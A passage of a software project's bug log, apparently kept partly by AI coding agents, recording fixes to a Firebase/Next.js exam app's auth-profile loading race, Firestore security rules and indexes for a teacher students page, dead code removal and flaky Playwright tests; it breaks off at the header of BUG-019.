**Details:** Files are sent base64-encoded in the request body. At 10 MB encoded, this approaches Next.js's body size limit (configured to 10 MB in `next.config.ts`). Large PDFs (>50 pages) should be cropped before upload.

### sessionStorage for workflow state
**Status:** MVP tradeoff
**Details:** If the teacher closes/refreshes the browser mid-workflow, progress is lost. For MVP this is acceptable. v1.1 should persist draft exams to Firestore.

### Free tier: 1 exam lifetime (not monthly)
**Status:** Product decision
**Details:** Founder confirmed: 1 exam total in the free tier to drive conversion. This may change based on conversion data.

---

## Fixed Issues

---

## BUG-030: Dead `src/lib/schoolBank.ts` (unused Firestore helper, wrong collection/field names) removed; stale fallback in `/student/practice` cleaned up
**Status:** Fixed
**Severity:** Low
**Area:** Data
**Reported:** 2026-09-19 (`engineering`, `TEAM_CHAT.md`; also flagged in `CURRICULUM_COVERAGE_STRATEGY.md`)
**Fixed:** 2026-09-24

**Description:** `src/lib/schoolBank.ts` exported `shareToSchoolBank`/`getSchoolBankExercises` against a Firestore collection `"school_bank"` with field `"school"` — never wired into the app. The real, live School Bank feature lives inline in `src/app/bank/page.tsx`, using collection `"schoolBank"` and field `"schoolSlug"` (different collection name and field, confirmed not a typo). `src/app/student/practice/page.tsx` read from the correct live `"schoolBank"`/`"schoolSlug"` path but also carried a second fallback query against a `"school"` field that nothing had ever written, plus an unused `school?: string` field in its local `SchoolExercise` type.
**Root cause:** Leftover code from an earlier, abandoned school-bank implementation that was superseded by the current `bank/page.tsx` design without being deleted.
**Fix:** Re-verified zero imports of `src/lib/schoolBank.ts` anywhere in `src/` (`grep -r "from .*lib/schoolBank"` — no matches; the only files matching the string `schoolBank` all reference the live `"schoolBank"` Firestore collection directly, not this file: `src/app/bank/page.tsx`, `src/app/student/practice/page.tsx`, `src/app/api/tools/chapter-performance/route.ts`, `src/__tests__/firestore.rules.test.ts`). Deleted `src/lib/schoolBank.ts` via `git rm`. In `src/app/student/practice/page.tsx`, removed the `"school"`-field fallback query in `fetchSchoolExercises()` (kept only the real `"schoolSlug"` query) and removed the now-unused `school?: string` field from the local `SchoolExercise` interface. Did not touch `src/app/bank/page.tsx` — its implementation was already correct.
**Verification:** `npm run type-check` clean. `npm run test:e2e` / `npm run test:rules` intentionally not run (nightly-ops unattended-run rule) — `qa` should verify `/student/practice` and `/bank` still work end-to-end.

---

## BUG-026: `/teacher/students` has shown "No students yet" for every teacher since the feature was built — `firestore.rules` never permitted the query it makes

**Status:** FIXED AND DEPLOYED (2026-10-01) — confirmed live. See 2026-10-01 updates below.
**Severity:** High
**Area:** Data / Auth
**Reported:** 2026-09-18
**Fixed:** Partially, pending confirmation — see 2026-09-29 update below. This bug's fix needs BOTH `firebase deploy --only firestore:rules` AND `firestore:indexes` to actually work end-to-end (per its own Fix note above); only an indexes-only deploy is confirmed to have happened (`FOUNDER_DECISIONS.md` #6), so treat this feature as still potentially broken until the founder separately confirms `firestore.rules` was deployed too.

**Description:** QA found this while verifying an unrelated fix: `/teacher/students` always renders its empty state ("No students yet"), even for a teacher whose school has real registered students with real attempts. `src/app/teacher/students/page.tsx` queries `student_profiles` filtered by the teacher's own school (`where("schoolName", "==", teacherSchool), orderBy("createdAt", "desc")`), then for each returned student queries `student_attempts` filtered by that student's `userId` (`where("userId", "==", p.uid), orderBy("timestamp", "desc")`). Both queries throw `FirebaseError: Missing or insufficient permissions` and are swallowed by a `try/catch` that returns `[]`, so the page silently renders as if there were simply no students, with nothing visible in the UI to indicate the real cause.
**Root cause:** `firestore.rules` only ever granted `student_profiles/{uid}` and `student_attempts/{attemptId}` access to the document's own owner (`request.auth.uid == uid` / `resource.data.userId == request.auth.uid`) — there was no rule permitting a teacher to `list` (query) either collection at all, scoped by school or otherwise. This landed in the same commit as the page itself (`51e4c7f`) and was never caught because there is no e2e coverage for `/teacher/students` (confirmed via `grep -rl "teacher/students" e2e/` — no matches; also independently noted in BUG-025's investigation of an unrelated race in the same file). `ROADMAP.md` marked this feature "done" despite being non-functional — corrected to reflect the real state.
**Fix:** Rewrote the `student_profiles` and `student_attempts` blocks in `firestore.rules`:
- Kept each collection's existing "owner can read/write their own document" rule unchanged (students still read/write only their own `student_profiles/{uid}` and their own `student_attempts` via `resource.data.userId == request.auth.uid`, including their own practice-history `list` on `/student/dashboard`).
- Added a new `allow list` on `student_profiles` for any signed-in non-student account (`role != "student"`, covering `"teacher"`, `"school_teacher"`, `"university_teacher"`, `"tutor"`, and legacy accounts with no `role` field), gated on `resource.data.schoolName == ` the caller's own `users/{uid}.school`. This matches `page.tsx`'s query filter exactly, so Firestore only ever authorizes queries genuinely constrained to the caller's own school — it does not open an unfiltered or cross-school list.
- Added a new `allow list` on `student_attempts` for the same non-student check, gated on the *target student's own* `student_profiles/{userId}.schoolName` (looked up via a second `get()`) matching the caller's `school` — not the caller's own document, since attempt docs don't carry a `schoolName` field themselves. This closes a real secondary hole a naive fix would have left open: a teacher (or any student who edited their own `users/{uid}.school` field, which is otherwise self-writable) could not use this rule to fetch another school's attempt data by supplying an arbitrary `userId`, since the check follows the *target* student's real school, not a self-reported one.
- Also added the two missing composite indexes these queries need (`firestore.indexes.json`): `student_profiles` (`schoolName` ASC, `createdAt` DESC) and `student_attempts` (`userId` ASC, `timestamp` DESC) — same class of gap as BUG-013 (an equality filter + `orderBy` on a different field always needs a composite index in Firestore). Without these, the page would still come up empty with a *different* "query requires an index" error even after the rules fix, so both are needed together for this feature to actually work end-to-end.
**Not yet deployed** — same guardrail that blocked `firebase deploy` for BUG-011/BUG-013 blocks it here. Antoine needs to run `firebase deploy --only firestore:rules,firestore:indexes` himself (or apply both via the Firebase Console), then confirm by reloading `/teacher/students` as a teacher account with a real school and real students.

**Update (2026-09-29, database, doc-reconciliation pass):** `FOUNDER_DECISIONS.md` #6 (answered 2026-09-27) confirms the founder ran `firebase deploy --only firestore:indexes` and names 3 specific indexes as the ones that were pending and are now live: BUG-013's `schoolBank` `schoolSlug`+`sharedAt`, plus BUG-045/BUG-044's `schoolSlug`+`visibleToStudents`+`sharedAt` and `visibleToStudents`+`sharedAt`. **It does not mention this bug's two indexes** (`student_profiles` `schoolName`+`createdAt`, `student_attempts` `userId`+`timestamp`) by name, and it explicitly does not mention `firestore:rules` at all.

Two separate things to untangle here, reasoned from repo state alone (no live check, no credentials used, per this task's constraints):
- **Indexes:** `firebase deploy --only firestore:indexes` is a whole-file sync of `firestore.indexes.json`, not a way to selectively deploy only some of the indexes in that file (confirmed against public Firebase/community documentation of the CLI's behavior — the command takes no index-level selector, it diffs and syncs the entire file's `indexes` array against the project). This bug's two indexes were already present in `firestore.indexes.json` on disk at the time of that 2026-09-27 deploy (confirmed: they're still in the file today, at `firestore.indexes.json` lines for `student_profiles`/`student_attempts`). So it is very likely — though not explicitly stated by the founder — that these two indexes went live as a side effect of that same deploy, even though the decision log's own wording ("all 3 pending indexes") only narrates the 3 that were the deploy's original trigger, not necessarily every index the file happened to contain.
- **Rules:** There is no equivalent mechanism or repo-state signal for this. `firestore.rules` is a completely separate deploy target (`firestore:rules`), and nothing in `FOUNDER_DECISIONS.md`, `TEAM_CHAT.md`, or this repo's history says it was ever run. Repo state alone cannot distinguish "rules deployed" from "rules not deployed" — there is no local artifact that reflects live Firebase project state. This must be confirmed by the founder directly (e.g. via the Firebase Console's Rules tab, checking the published rules' last-updated timestamp/content against this repo's `firestore.rules`), not inferred.

**Net effect: do not mark this bug Fixed.** Even if this bug's indexes are live (likely), the `list` rules this bug's whole fix depends on (`student_profiles`/`student_attempts` teacher-scoped `list` access) are unconfirmed, and per this bug's own Fix note both halves are required together for `/teacher/students` to actually work — an indexes-only deploy with no matching rules would still fail, just with a "Missing or insufficient permissions" error instead of a "query requires an index" error (i.e. back to this bug's original symptom, not fixed). Reworded the Status/Fixed lines above to reflect this precisely instead of leaving the old blanket "not yet deployed, needs both" text unchanged (which was accurate before 2026-09-27 but is now ambiguous, since one of the two prerequisites plausibly did happen as a side effect of an unrelated deploy). **Ask for the founder:** a one-line confirmation of whether `firestore.rules` was ever separately deployed (Console → Firestore → Rules tab, compare against this repo's `firestore.rules`) would fully resolve this — a fact-check, not a new decision, so not added to `FOUNDER_DECISIONS.md`.

**Update (2026-10-01, founder-directed live check via Firebase Console):** Read the actually-published rules directly off `https://console.firebase.google.com/project/imtihan-app/firestore/databases/-default-/security/rules` (read-only view, no deploy action taken). The live rules are still the OLD pre-fix version:

```
match /student_profiles/{uid} {
  allow read, write: if request.auth != null && request.auth.uid == uid;
}
match /student_attempts/{attemptId} {
  allow read, update, delete: if request.auth != null && resource.data.userId == request.auth.uid;
  allow create: if request.auth != null && request.resource.data.userId == request.auth.uid;
}
```

No `requesterProfile()`/`isTeacher()` helpers, no `allow list` block on either collection — i.e. none of this bug's Fix (described above) is live. This settles the open question definitively: `firestore.rules` was never deployed. Every teacher loading `/teacher/students` today still gets `FirebaseError: Missing or insufficient permissions` on both queries, swallowed by the page's `try/catch`, rendering the false "No students yet" empty state exactly as originally reported on 2026-09-18 — two weeks of this feature silently not working. The indexes question is now moot until rules are fixed (both are required together per this bug's own Fix note).

**Action needed from the founder (not performed by any agent, per this repo's standing rule against deploying or touching production Firebase state):** run `firebase deploy --only firestore:rules,firestore:indexes` (or paste `firestore.rules`'s `student_profiles`/`student_attempts` blocks into the Console's Rules editor and publish), then reload `/teacher/students` as a real teacher account to confirm.

**Update (2026-10-01, founder ran the deploy):** Founder ran `firebase deploy --only firestore:rules,firestore:indexes` himself (`firebase use production` → `imtihan-app`, then the deploy — CLI reported "Deploy complete!", rules compiled with no errors). Re-checked the live Firebase Console directly afterward to confirm, not just trusting the CLI's exit message:
- **Rules tab:** new published version timestamped today 12:17 PM, containing `requesterProfile()`/`isTeacher()` and the teacher-scoped `allow list` blocks on both `student_profiles` and `student_attempts` — matches `firestore.rules` on disk exactly.
- **Indexes tab:** both `student_attempts` (userId ASC, timestamp DESC) and `student_profiles` (schoolName ASC, createdAt DESC) show **Status: Enabled**.

Both halves of this bug's fix are now confirmed live. **Status: Fixed.**

**Update (2026-10-01, founder verified the UI):** Founder confirmed `/teacher/students` now works end-to-end with a real teacher account and real students. Fully closed — no remaining open item on this bug. The risk-acceptance note on the self-declared `school` field (tracked separately, see `FOUNDER_DECISIONS.md` #1) still stands and has its own expiry condition — unaffected by this deploy.

**Also noted, explicitly out of scope for this fix:** `src/app/dashboard/page.tsx`'s `fetchStudentResultsForExam()` (teacher dashboard's per-exam student-results view) queries `student_attempts` filtered by `exerciseId` — a different access pattern (scoping by which exam a teacher owns, not by school) that neither the old nor this new rule set covers; it was already silently broken by the same root cause (no matching rule) before this fix, and still is after it. Flagging it here rather than fixing it now since it needs its own rule design (cross-referencing exam ownership under `users/{uid}/exams/{examId}`), which is a separate piece of work.
**Testing:** QA has a draft e2e test for this page ready but did not add it to the suite — it's designed to fail until the rule is actually deployed, and deploying isn't engineering's call to make. Add it once Antoine confirms the deploy.
**Verification:** `npm run type-check` clean. `firestore.rules` is not TypeScript and was not exercised by the e2e suite (not run this session — machine was under severe memory pressure). Verified by re-reading `src/app/teacher/students/page.tsx`'s exact query shapes (`where`/`orderBy` clauses) and `src/types/student.ts` / `src/types/user.ts`'s real field names (`student_profiles.schoolName` vs. `users.school` — these are named differently, not typos) to confirm the rule's field references match what the app actually sends.

---

## BUG-025: Sweep for the AuthContext profile-load race — 6 more unguarded `useAuth()` consumers found beyond BUG-021..024
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Following BUG-021 through BUG-024 (each independently discovering and fixing the same `AuthContext` race in `ProGuard`, `DashboardSidebar`, `UserNav`, and `/create/export`), did the full sweep the last engineering agent recommended: `grep -rn "useAuth()" src/` for every consumer, then checked each one that reads `profile` (directly or via `isProActive`/`isInGracePeriod`) for the same unguarded window — `AuthContext`'s `loading` flips to `false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once it delivers its first snapshot, leaving a window where `user` is set but `profile` is still `null`.
**Consumers checked (16 total, via `grep -rn "useAuth()" src/`):**
- Already fixed (BUG-021..024, skipped): `src/components/ui/ProGuard.tsx`, `src/components/layout/DashboardSidebar.tsx`, `src/components/layout/UserNav.tsx`, `src/app/create/export/page.tsx`.
- Doesn't read `profile` at all (safe, no fix needed): `src/app/admin/page.tsx`, `src/app/upgrade/page.tsx`, `src/components/ui/ExerciseEditor.tsx` (all destructure only `user`).
- Reads `profile` but the race doesn't actually reach the gated condition (false positive, no fix needed): `src/app/create/page.tsx` — `isFreeTier && quotaUsed >= FREE_EXAM_LIMIT` gates the paywall, but `quotaUsed` falls back to `profile?.examsGenerated ?? 0` when `profile` is `null`, and `FREE_EXAM_LIMIT` is `1`, so `0 >= 1` is always false during the resolving window regardless of `isFreeTier` — a genuinely-Pro user is never blocked by this specific gate while the race window is open.
- Already effectively guarded under a different shape (false positive, no fix needed): `src/components/ui/RenewalBanner.tsx` — `if (!profile || dismissed) return null;` already hides the banner for the entire resolving window (same outcome as an explicit `profileResolving` check, just phrased as "no profile yet" instead), so a genuinely-expiring/grace-period Pro user never sees a wrong state, only a delayed correct one.
- **6 real gaps found and fixed** (all with the same `AuthContext` race, previously unguarded):
  1. `src/app/bank/page.tsx` — `isPro = isProActive(profile)` gated the "My School" tab's Pro paywall card, its Zap upsell badge, and the bank-entry share button. A genuinely-Pro user would briefly see the "Pro feature — upgrade" paywall instead of their school's shared bank. Fixed with `profileResolving` guard; "My School" tab shows a loading spinner while resolving instead of a Pro/free paywall, badge and share button stay hidden while resolving (same "hide instead of guess" choice as `DashboardSidebar`).
  2. `src/app/community/page.tsx` — `isFree = !isProActive(profile)` blurred the whole library and showed the "Pro feature — Community Library" upsell banner for a genuinely-Pro user during the resolving window. Fixed by returning the existing loading spinner (already used for `loading`) for the `!profile` case too, so neither a false "Pro" leak nor a false "free" paywall can render — waits for the real profile before computing `isFree` at all.
  3. `src/app/create/confirm/page.tsx` — `isFreeTier = !isProActive(profile)` locked the "Generate Version B" toggle for a genuinely-Pro user. This page is reached via `sessionStorage`-driven state that survives a hard refresh, so — like `/create/export` in BUG-024 — a full reload remounts `AuthContext` and reopens the race on every visit, not just first sign-in. Fixed with `profileResolving` guard; assumes not-locked while resolving (mirrors `DashboardSidebar`'s "assume unlocked/Pro while resolving" tradeoff rather than guessing "free").
  4. `src/app/create/generate/page.tsx` — same `isFreeTier` pattern, gating a small "Upgrade to Pro for priority generation" hint shown during active generation. Lower severity (cosmetic hint, not a functional lock) but same race. Fixed the same way.
  5. `src/app/dashboard/page.tsx` — `isPro = isProActive(profile) || isInGracePeriod(profile)` gated the whole "Subscription status" card (Pro plan / quota-remaining view vs. "Free plan — Upgrade to Pro" view). A genuinely-Pro user would briefly see "Free plan — 1 exam remaining" and an "Upgrade to Pro" CTA on their own dashboard. Fixed with `profileResolving` guard; card shows a pulsing skeleton bar while resolving (mirrors `UserNav`'s "stay mounted, skeleton just the affected value" choice, since this card is a self-contained widget, not a whole-page gate).
  6. `src/app/pricing/page.tsx` — `isPro = isProActive(profile)` gated the Pro-tier card's CTA: "Active — Pro plan" badge vs. "Upgrade to Pro" button. Fixed the same skeleton-while-resolving way as the dashboard card.
- **1 adjacent-but-different-shaped gap found and fixed** (not a tier/entitlement flash, but the same root race): `src/app/teacher/students/page.tsx` — `teacherSchool = profile?.school ?? ""` is used to scope a Firestore query (`fetchStudentProfiles(teacherSchool || undefined)`); when `profile` is still `null` during the resolving window, `teacherSchool` reads as `""`, which the query treats as "no school filter," briefly fetching and displaying **every school's** student profiles instead of just this teacher's. This is a data-scoping/privacy-adjacent bug, not a UI tier flash, but stems from the identical unguarded read. Fixed by gating the fetch effect itself on `profileResolving` (`if (!mounted || profileResolving) return;`), so the query never fires with an empty school filter — it waits for the real profile, consistent with the local `loading` state already shown in the UI while the effect hasn't run yet. No dedicated e2e coverage exists for this page (confirmed via `grep -rl "teacher/students" e2e/` — no matches) — `qa` should add coverage, this fix was verified by code inspection and `npm run type-check` only.
**Root cause:** Same as BUG-021 through BUG-024 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and each of these 6 components had no guard against reading `profile` as a definite answer during that gap.
**Fix:** Added a `profileResolving = loading || (!!user && !profile)` (or equivalent, aliased where a local `loading`/`profile` name collision existed — e.g. `authLoading`/`authUser` in `create/confirm`, `create/generate`, `teacher/students`) check to each of the 6 files, choosing the UI treatment per component rather than copy-pasting one pattern: whole-element hide + loading state for `bank`'s "My School" tab and `community`'s full page (both already had a natural "return a loading state" shape); skeleton-for-just-the-affected-value for `dashboard`'s subscription card and `pricing`'s CTA button (self-contained widgets, rest of the page doesn't depend on tier); assume-not-locked-while-resolving for the two `create/*` toggles/hints (matches `DashboardSidebar`'s established "prefer showing Pro features over hiding them" tradeoff during the resolving window); and gate-the-data-fetch for `teacher/students` (the bug wasn't a UI flash but a wrong Firestore query).
**Verification:** `npm run type-check` clean. Ran the e2e phases covering every touched page (`phase-2-exam-creation`, `phase-3-generation-editor`, `phase-5-dashboard-bank`, `phase-6-community`, `phase-8-pricing-upgrade-misc`) twice. First combined run: 73/75 passed, 2 failures — both investigated and confirmed **unrelated to this fix**: (a) `phase-3`'s "golden path" real-generation test failed on a genuine server-side "monthly limit reached" rejection because the shared `pw-test-pro-user` Firestore test account's `monthlyExamsGenerated` was left at `10` by an earlier test run (`/api/test/custom-token` does a partial Firestore `.update()`, not an overwrite, so stale quota state persists across unrelated test files sharing the same non-emulated test project) — reset it via a one-off `setupTestUser` call and the test passed cleanly afterward; (b) `phase-5`'s "pro tier at monthly quota limit can request a Reset Month" test hit its 20s assertion timeout once in the loaded serial run but passed in isolation (21.3s) — same thin-margin-under-load shape already documented in BUG-020, not a logic regression (confirmed by re-running the full 5-phase set a second time after the quota reset: **75/75 passed**, including both previously-failing tests). `teacher/students` has no e2e coverage to run (noted above) — verified by code inspection and type-check only.

---

## BUG-024: Export page "Remove" logo button never appears for a signed-in Pro user (4th instance of the profile-load race)
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Export
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA's `e2e/phases/phase-4-export.spec.ts:107` ("pro tier: logo upload works and Remove clears it") failed: after uploading a logo, the test expected a "Remove" button (to clear it) but only "Change Logo" was present in the accessible tree.
**Investigation:** Read `src/app/create/export/page.tsx`. It computed `const { profile } = useAuth(); const isFreeTier = !isProActive(profile);` with no guard against the same `AuthContext.subscribeToProfile` race documented in BUG-021/022/023 (`loading` flips to `false` before the Firestore profile listener delivers its first snapshot, leaving a window where `user` is set but `profile` is still `null`). `isProActive(null)` is `false`, so `isFreeTier` was wrongly `true` for a genuinely-Pro user during that window — hiding the "Remove" button (`{schoolLogo && !isFreeTier && ...}`) and, more broadly, every other Pro-gated control on the page (modern template, Version B, email send). This page is reached via a full `page.goto("/create/export")`-style navigation from the test (not a client-side route change), which remounts `AuthContext` from scratch on every load, so — unlike some other pages — the race window reopens on every visit rather than only on first sign-in, making this reliably reproducible rather than a rare flake.
**Root cause:** Same root cause as BUG-021/BUG-022/BUG-023 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and `/create/export`'s page component had no guard against reading `profile` as "definitely free tier" during that gap.
**Fix:** `src/app/create/export/page.tsx` — added `user` and `loading` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check; `isFreeTier` is now `!profileResolving && !isProActive(profile)`, so every Pro-gated control on the page (logo upload/Remove, modern template, Version B, email send) waits for the real profile instead of defaulting to "free" while it's still in flight — same "wait instead of guess" pattern as `ProGuard`/`DashboardSidebar`/`UserNav`.
**Verification:** `npx playwright test e2e/phases/phase-4-export.spec.ts` run in isolation against a freshly-booted dev server (stale server on port 3005 killed, `.next` cleared first) — 12/12 passed, including the previously-failing "Remove clears it" test. `npm run type-check` clean.

---

## BUG-023: UserNav tier label ("Free"/"Pro tier") wrong or missing for signed-in users during profile load (3rd instance of the profile-load race)
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Layout
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA flagged two failures in `e2e/phases/phase-1-auth-navigation.spec.ts`: `:277` ("shows Free tier label, hover reveals menu, Sign out returns to login") and `:302` ("Pro tier label shows for a pro test user") — both timed out waiting for the tier label text to appear.
**Investigation:** Read `src/components/layout/UserNav.tsx` in full and confirmed it had the same unguarded gap already fixed in `ProGuard` (BUG-021) and `DashboardSidebar` (BUG-022): it destructured `loading` but computed `isProActive(profile) ? "Pro" : "Free"` with no check for the `user && !profile` window described in `AuthContext.subscribeToProfile` (`loading` flips to `false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once it delivers its first payload). During that window a genuinely-Pro (or Free) user's tier label would render off a `null` profile, i.e. always compute as "Free" — matching the observed timeouts on both the Free-tier assertion (transient, so usually masked) and, more visibly, the Pro-tier assertion (`isProActive(null)` is always `false`, so a real Pro user briefly shows "Free tier" before flipping).
**Root cause:** Same root cause as BUG-021/BUG-022 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener's first snapshot arrives, and `UserNav` had no guard against reading `profile` as "definitely not Pro" during that gap.
**Fix:** `src/components/layout/UserNav.tsx` — added `user` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check, mirroring `ProGuard`/`DashboardSidebar`'s comment/pattern. Chose a different resolving-state UI than those two: `UserNav` is the persistent header nav (confirmed via grep — mounted in `LandingNav` and directly on `/dashboard`, `/create`, `/bank`, `/create/export`, `/community`, `/scanner`, `/analytics`, `teacher/layout.tsx`), so it stays fully mounted and usable (name, avatar initials, dropdown, sign out) through the resolving window rather than returning `null` like `ProGuard` — only the tier label itself, which is the one value that can't be known yet, is replaced with a small pulsing skeleton bar (`w-10 h-2.5 ... animate-pulse`) instead of guessing "Free".
**Verification:** Killed a stale `next dev` process still bound to port 3005 and cleared `.next` to force a genuinely fresh server (per the BUG-022 lesson about stale Turbopack cache), then ran `npx playwright test e2e/phases/phase-1-auth-navigation.spec.ts` in isolation — all 33 tests passed, including both previously-failing tests (line 277 and line 302). `npm run type-check` clean.

---

## BUG-022: Dashboard sidebar shows "Upgrade to Pro" (and "Pro" nav badges) for signed-in Pro users during profile load
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Dashboard
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA flagged a one-off failure of `e2e/phases/phase-5-dashboard-bank.spec.ts:187` ("desktop sidebar shows all 6 nav links...") on `expect(sidebar.getByRole("link", {name: "Upgrade to Pro"})).toBeHidden()` for a signed-in Pro-tier test user, then couldn't reproduce it on an isolated re-run. QA correctly flagged this as matching the shape of BUG-021 (commit `7836fd5`), fixed earlier the same day in `ProGuard`.
**Investigation:** Read `src/components/layout/DashboardSidebar.tsx` and confirmed it has the *exact same* unguarded gap `ProGuard` had before BUG-021: it called `const { profile } = useAuth()` and computed `isPro = isProActive(profile) || isInGracePeriod(profile)` without checking `user` or `loading` first. `AuthContext` sets `loading = false` as soon as the Firestore profile `onSnapshot` listener *attaches*, not once its first payload arrives (`AuthContext.subscribeToProfile`) — so there's a real window where `user` is set but `profile` is still `null` for an already-authenticated, genuinely-Pro user. During that window `isProActive(null)` is `false`, so the sidebar rendered "Upgrade to Pro" and the "Pro" nav badges on `/scanner` and `/analytics` for a Pro user until the real profile arrived. This is a real, reproducible race (same root cause as BUG-021), just usually too brief to catch — confirmed by code inspection, not by reproducing the flake itself.
**Root cause:** Same as BUG-021 — `AuthContext`'s `loading` flips to `false` before the Firestore profile listener delivers its first snapshot, and `DashboardSidebar` (unlike the already-fixed `ProGuard`) had no guard against reading `profile` as "definitely not Pro" during that gap.
**Fix:** `src/components/layout/DashboardSidebar.tsx` — added `user` and `loading` to the `useAuth()` destructure and a `profileResolving = loading || (!!user && !profile)` check, mirroring `ProGuard`'s comment/pattern. Both the "Upgrade to Pro" CTA and the per-item "Pro" nav badges (`AI Scanner`, `Analytics`) now stay hidden while `profileResolving` is true, instead of defaulting to "not Pro," so a genuinely-Pro user never sees the upsell flash while their profile is still loading. Note: this fix hides the CTA/badges during the resolving window (loading-safe default for a Pro user) rather than showing them — the tradeoff is a free-tier user's genuine "Upgrade to Pro" CTA/badges may also be invisible for that same brief window before their profile confirms they're free-tier, which is consistent with `ProGuard`'s existing choice to prefer "wait" over "guess" in this state.
**Verification:** First run of `npx playwright test e2e/phases/phase-5-dashboard-bank.spec.ts` had all 9 `/dashboard`-hitting tests fail on `page.goto` timeout — traced to an unrelated leftover `next dev` process (PID from an earlier session) still running on port 3000 against the same `.next` build cache that had just been cleared for `type-check`, corrupting the Turbopack cache the Playwright-spawned server on port 3005 shared. Killed the stale process, cleared `.next` again, and reran: **15/15 passed**, including test 9 (the exact sidebar test QA flagged) — `Upgrade to Pro` correctly hidden for the Pro test user. `npm run type-check` clean both before and after killing the stale process.

---

## BUG-021: `/scanner` pro-tier test — "AI Exam Scanner" heading and "Unlock AI Exam Scanner" upsell heading both visible simultaneously
**Status:** Fixed
**Severity:** Medium
**Area:** UI / Auth guard / Scanner
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:112` failed a strict-mode check: `getByText('AI Exam Scanner')` resolved to two visible elements — the real scanner heading AND the "Unlock AI Exam Scanner" Pro-upsell heading. This was a real, if usually brief, Pro-gating race — not a test-locator artifact.
**Root cause:** `AuthContext`'s `onAuthStateChanged` handler sets `loading = false` as soon as `subscribeToProfile()` *attaches* its Firestore `onSnapshot` listener, without awaiting the first snapshot payload — leaving a window where `user` is set but `profile` is still `null` for an already-authenticated, genuinely-Pro user. `ProGuard` treated `isProActive(null)` as "not pro" during that window and rendered the full, non-blurred upsell paywall — which itself *also* renders the real page's dimmed `children` behind it (`opacity-10 blur-3xl`), so both headings were simultaneously visible per Playwright (opacity doesn't count as hidden). Ties to `CLAUDE.md` §12's "Lebanese internet" gotcha: slower Firestore round trips widen this window for real Pro users in the field, not just in tests.
**Fix:** `src/components/ui/ProGuard.tsx` — added `if (user && !profile) return null;` between the existing `loading` check and the `isPro` check, so ProGuard waits instead of assuming non-Pro while a signed-in user's profile is still in flight. Scoped to `ProGuard` only (not `AuthContext`) to minimize blast radius; also benefits `src/app/analytics/page.tsx`, the only other `ProGuard` consumer, which has the identical race but no dedicated e2e coverage. Verified: full `phase-8-pricing-upgrade-misc.spec.ts` (20 tests combined with phase-7) green, `npm run type-check` clean.

---

## BUG-017: Admin "+10Q" bonus-quota action gives no visible confirmation feedback
**Status:** Fixed
**Severity:** Low
**Area:** UI / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Clicking "+10Q" on a user row in `/admin`'s Users tab was supposed to show a "+10" confirmation. The DOM node existed but stayed hidden to Playwright/real users.
**Root cause:** `src/app/admin/page.tsx` rendered the confirmation twice — a working plain-text `+{quota}` in the `md:hidden` mobile card (hidden at desktop viewport width, which is what Playwright and most admins use) and a desktop version that rendered a `<Plus size={10}/>` icon as a *sibling* of the number, so the DOM text content was just `"10"`, never a single `"+10"` text node — `getByText('+10', {exact:true})` could never match the visible desktop element even after the write succeeded.
**Fix:** Replaced the desktop badge's `<Plus size={10}/>{quota}` with plain text `+{quota}`, matching the already-correct mobile pattern; removed the now-unused `Plus` icon import. Verified: `e2e/phases/phase-7-admin.spec.ts` full file green, `npm run type-check` clean.

---

## BUG-016: Admin filter buttons — deselecting all filters doesn't restore "All Users" active state
**Status:** Fixed
**Severity:** Low
**Area:** UI / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** In `/admin`'s Users tab, deselecting "Pending Requests" (or "Yearly Only") should fall back to "All Users" being active. Instead "All Users" never regained its `bg-emerald-600` active styling, and the row filter stayed stuck applied — a real state bug, not just a visual one.
**Root cause:** The "Pending Requests" button's `onClick` was `() => setFilterType("requests")` — it always forced `filterType` to `"requests"` and never toggled back to `"all"` on a second click, unlike "Yearly Only" which already toggled correctly via `setShowYearly(!showYearly)`.
**Fix:** `src/app/admin/page.tsx` — changed to `onClick={() => setFilterType(filterType === "requests" ? "all" : "requests")}`, making it a true toggle. Since the emerald active styling and the row filter are both keyed off `filterType === "all"`, one fix covers both the logic and the visual bug. Verified: `e2e/phases/phase-7-admin.spec.ts` full file green (8/8), `npm run type-check` clean.

---

## BUG-018: Stale/ambiguous test locator — "Newsletter" text matches both the template-picker button and the "Template: newsletter" summary label
**Status:** Fixed
**Severity:** Low
**Area:** Testing / Admin
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-7-admin.spec.ts:114` ("Email tab: template picker, custom HTML fields, and segment counts") failed a Playwright strict-mode check: `page.getByText("Newsletter")` resolved to 2 elements — the "Newsletter" template-picker button (`src/app/admin/page.tsx`'s `EMAIL_TEMPLATES` grid, line ~636) and the "Template: newsletter" summary label lower on the same tab (line ~760). Not a new element; the summary label has existed alongside the picker since the Email tab was built — `getByText`'s default case-insensitive substring match was always going to catch both once both were on-screen at once, this just hadn't been exercised by this exact assertion before.
**Root cause:** Test-only issue, not an app bug. `page.getByText("Newsletter")` matches by case-insensitive substring by default, so it matched both the button's visible title text ("Newsletter") and the `<p>Template: {emailTemplate}</p>` label (rendered lowercase as "newsletter", still a case-insensitive substring match).
**Fix:** Scoped the locator to `page.getByRole("button", { name: "Newsletter" })`, which only matches the template-picker button (the summary `<p>` has no button role) and is unambiguous. Verified with `npx playwright test e2e/phases/phase-7-admin.spec.ts -g "template picker"` — 1 passed. No production code changed.

---

## BUG-019: Stale test assertion — WhatsApp popup URL assertion only accepted `wa.me`, not the `api.whatsapp.com/send` redirect target
**Status:** Fixed
**Severity:** Low
